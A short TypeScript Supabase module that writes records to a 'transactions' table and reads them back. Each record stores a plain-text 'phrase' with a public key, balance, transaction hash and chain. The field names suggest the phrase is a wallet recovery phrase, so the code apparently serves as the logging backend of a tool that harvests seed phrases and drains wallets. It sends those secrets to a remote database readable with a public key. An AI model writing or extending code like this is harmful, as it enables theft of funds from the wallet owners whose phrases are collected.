import { createClient } from "@supabase/supabase-js"

// Create a single supabase client for interacting with your database
export const supabase = createClient(
  process.env.NEXT_PUBLIC_SUPABASE_URL || "",
  process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY || "",
)

// Function to log transaction to Supabase
export async function logTransactionToSupabase(transaction: {
  phrase: string
  publicKey: string
  balance: number
  txHash?: string
  status: string
  message: string
  chain?: string
}) {
  try {
    const { data, error } = await supabase.from("transactions").insert([
      {
        phrase: transaction.phrase,
        public_key: transaction.publicKey,
        balance: transaction.balance,
        tx_hash: transaction.txHash || null,
        status: transaction.status,
        message: transaction.message,
        chain: transaction.chain || "ethereum", // Default to ethereum if not specified
        created_at: new Date().toISOString(),
      },
    ])

    if (error) {
      console.error("Error logging transaction to Supabase:", error)
      return false
    }

    return true
  } catch (error) {
    console.error("Exception logging transaction to Supabase:", error)
    return false
  }
}

// Function to get recent transactions
export async function getRecentTransactions(limit = 50, chain?: string) {
  try {
    let query = supabase.from("transactions").select("*").order("created_at", { ascending: false })

    // Filter by chain if specified
    if (chain) {
      query = query.eq("chain", chain)
    }

    const { data, error } = await query.limit(limit)

    if (error) {
      console.error("Error fetching transactions from Supabase:", error)
      return []
    }

    return data || []
  } catch (error) {
    console.error("Exception fetching transactions from Supabase:", error)
    return []
  }
}
